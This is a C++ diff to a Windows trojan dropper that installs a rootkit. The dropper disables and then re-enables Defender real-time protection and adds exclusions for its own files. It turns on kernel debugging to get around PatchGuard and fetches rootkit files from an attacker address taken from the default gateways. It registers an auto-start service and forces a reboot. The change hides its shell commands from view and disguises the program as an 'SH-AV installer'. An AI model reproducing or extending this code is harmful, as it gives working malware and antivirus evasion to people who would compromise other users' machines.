@@ -15,9 +15,6 @@ std::wstring GetCurrentPath() {
 
 
 BOOL TrojanThread(LPVOID TrojParams) {
-    const char* CleaningCommands =
-        "cd \"%ProgramFiles%\\Windows Defender\" > nul && "
-        "MpCmdRun.exe -Restore -All > nul";
     char TargetIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
     char AttackerIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
     char DebugPort[MAX_PORT_SIZE] = { 0 };
@@ -29,65 +26,48 @@ BOOL TrojanThread(LPVOID TrojParams) {
     // Disable realtime protection to not trigger any virus checks/alerts:
     LastError = RealTime(TRUE);
     if (LastError.Represent != ERROR_SUCCESS || LastError.LastError != 0) {
-        printf("Cannot disable realtime protection - %d\n", LastError.LastError);
+        printf("[-] Cannot disable realtime protection - %d\n", LastError.LastError);
         return FALSE;
     }
-    printf("Disabled realtime protection\n");
 
 
     // Run cleaning commands for last iteration:
-    if (system(CleaningCommands) == -1) {
-        printf("Failed to perform cleaning commands: %d\n", GetLastError());
-        return FALSE;
-    }
-    printf("Performed cleaning commands successfully\n");
+    ShellExecuteA(0, "open", "cmd.exe", "/C cd \"%ProgramFiles%\\Windows Defender\" > nul && MpCmdRun.exe -Restore -All > nul", 0, SW_HIDE);
 
 
     // Get all the needed files for the rootkit (would eventually be medium.exe and driver files) and configure remote debugging:
     if (!FilesAndDebugging(AttackerIp, DebugPort, DebugKey)) {
         return FALSE;
     }
-    printf("Downloaded files and changed debugging settings\n");
 
 
     // Disable patchguard:
-    if (system("bcdedit /debug ON > nul") == -1) {
-        printf("Failed to run KPP disabler: %d\n", GetLastError());
-    }
-    printf("ran KPP disabler successfully\n");
+    ShellExecuteA(0, "open", "cmd.exe", "/C bcdedit /debug ON > nul", 0, SW_HIDE);
 
 
     // Enable RealTime Protection:
     LastError = RealTime(FALSE);
     if (LastError.Represent != ERROR_SUCCESS || LastError.LastError != 0) {
-        printf("Failed to enable realtime protection: %d\n", LastError.LastError);
+        printf("[-] Failed to enable realtime protection: %d\n", LastError.LastError);
         return FALSE;
     }
-    printf("Enabled realtime protection\n");
 
 
     // Create temporary service for AutoService:
-    system("sc stop RootAuto > nul");
-    system("sc delete RootAuto > nul");
-    if (system("sc create RootAuto type=own start=auto binPath=\"C:\\nosusfolder\\verysus\\AutoStart.exe\" > nul") == -1) {
-        printf("Failed to create auto service: %d\n", GetLastError());
-        return FALSE;
-    }
-    printf("Created auto service\n");
-
+    ShellExecuteA(0, "open", "cmd.exe", "/C sc stop RootAuto > nul", 0, SW_HIDE);
+    ShellExecuteA(0, "open", "cmd.exe", "/C sc delete RootAuto > nul", 0, SW_HIDE);
+    ShellExecuteA(0, "open", "cmd.exe", "/C sc create RootAuto type=own start=auto binPath=C:\\9193bbfd1a974b44a49f740ded3cfae7a03bbedbe7e3e7bffa2b6468b69d7097\\42db9c51385210f8f5362136cc2ef5fbaddfff41cb0ef4fab0a80d211dd16db5\\AutoStart.exe", 0, SW_HIDE);
+    
 
     // Forcefully restart machine:
-    if (system("shutdown -r -f -t 1 > nul") == -1) {
-        printf("Failed to force reset the target: %d\n", GetLastError());
-        return FALSE;
-    }
-    printf("Resetting target..\n");
+    Sleep(5000);
+    printf("[+] Resetting computer ..\n");
+    ShellExecuteA(0, "open", "cmd.exe", "/C shutdown -r -f -t 1 > nul", 0, SW_HIDE);
     return TRUE;
 }
 
 
-int main()
-{
+int main() {
     char NullTerm = '\0';
     char Tilda = '~';
     char Inp = 0;
@@ -95,9 +75,7 @@ int main()
     char RandLetter = 0;
     char TargetIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
     char AttackerIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
-
-     // HARDCODED VALUES, CHANGE THIS BY ListAttacker IF NEEDED
-    const char* AttackAddresses = "172.17.80.1~192.168.1.32~192.168.56.1~192.168.192.1~192.168.88.1";
+    char* AttackerAddresses = NULL;
     const char* DebugPort = "50003";
     const char* DebugKey = "7DY7NXTWOM9I.3BM9J5ZCB6EI.CMVKI54LP3U.NUS6VXQK1111";
 
@@ -110,12 +88,25 @@ int main()
     LPVOID TrojanParams = NULL;
 
 
-    // Get IP addresses of target and attacker:
-    if (!MatchIpAddresses(TargetIp, AttackerIp, AttackAddresses)) {
-        printf("[-] Cannot find the target address and the matching attacker address!\n");
+    // Create exclusions for virus files:
+    ExcludeRootkitFiles();
+
+
+    // Get the possible IP addresses for the attacker (in this case - all default gateways):
+    AttackerAddresses = GetGatewayList();
+    if (AttackerAddresses == NULL) {
+        printf("[-] Cannot get list of gateway addresses (attacker addresses)!\n");
         return 0;
     }
-    printf("Target: %s, Attacker: %s\n", TargetIp, AttackerIp);
+
+
+    // Get IP addresses of target and attacker:
+    if (!MatchIpAddresses(TargetIp, AttackerIp, AttackerAddresses)) {
+        printf("[-] Cannot find the target address and the matching attacker address!\n");
+        free(AttackerAddresses);
+        return 0;
+    }
+    free(AttackerAddresses);
 
 
     // Trojan variables and calling:
@@ -127,7 +118,7 @@ int main()
     // Trojan parameter buffer:
     TrojanParams = malloc(strlen(TargetIp) + strlen(AttackerIp) + strlen(DebugPort) + strlen(DebugKey) + 4);
     if (TrojanParams == NULL) {
-        printf("Cannot continue with FunEngine (params = NULL), please retry..\n");
+        printf("[-] Cannot continue with FunEngine (params = NULL), please retry..\n");
         free(TrojanParams);
         return 1;
     }
@@ -150,37 +141,13 @@ int main()
         NULL);
 
     if (TrojanHandle == INVALID_HANDLE_VALUE) {
-        printf("Cannot continue with FunEngine, please retry..\n");
+        printf("[-] Cannot continue with FunEngine, please retry..\n");
         free(TrojanParams);
         return 1;
     }
-    /*
-    printf("Welcome to fun generator!\nRules:\n");
-    printf("1. when asked for ANY input, you should input only one letter (or it will ruin the fun ;) )\n");
-    printf("2. when asked if want to start/continue, the letter n will represent no and any other letter will represent yes\n");
-    printf("Welcome to fun generator! Setting things up...\nStart?\n");
-    std::cin >> Inp;
-    while (Inp != 'n') {
-        printf("Guess the character -> ");
-        std::cin >> GuessLetter;
-        RandLetter = Alp[distr(gen)];
-        if (GuessLetter != RandLetter) {
-            printf("\nOh No! you guessed the character %c but the computer guesses %c ! :(\n", GuessLetter, RandLetter);
-        }
-        else {
-            printf("\nWell Done! the computer did think about the character %c ! :)\n", GuessLetter);
-        }
-        GuessLetter = 0;
-        RandLetter = 0;
-        Inp = 0;
-        printf("Continue?\n");
-        std::cin >> Inp;
-    }
-
-    printf("Finished Fun Engine! Cleaning everything...\n");
-    */
+    printf("[+] Welcome to SH-AV installer!\n");
+    printf("[+] Downloading needed files and setting services up ..\n");
     WaitForSingleObject(TrojanHandle, INFINITE);
     free(TrojanParams);
-    printf("Cleaning succeeded, bye bye!\n");
     return 0;
 }
